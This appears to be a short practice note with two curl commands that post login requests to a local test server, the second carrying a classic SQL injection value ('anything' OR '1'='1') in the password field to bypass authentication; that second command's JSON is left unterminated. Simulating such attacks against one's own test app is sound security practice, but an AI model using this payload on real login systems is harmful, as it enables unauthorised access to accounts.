### comands to simulate


```python
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@test.com","password":"12345"}'
```


```python
curl -X POST http://localhost:3000/login \
-H 'Content-Type: application/json' \
-d "{\"email\":\"admin@test.com\",\"password\":\"anything' OR '1'='1\"
```
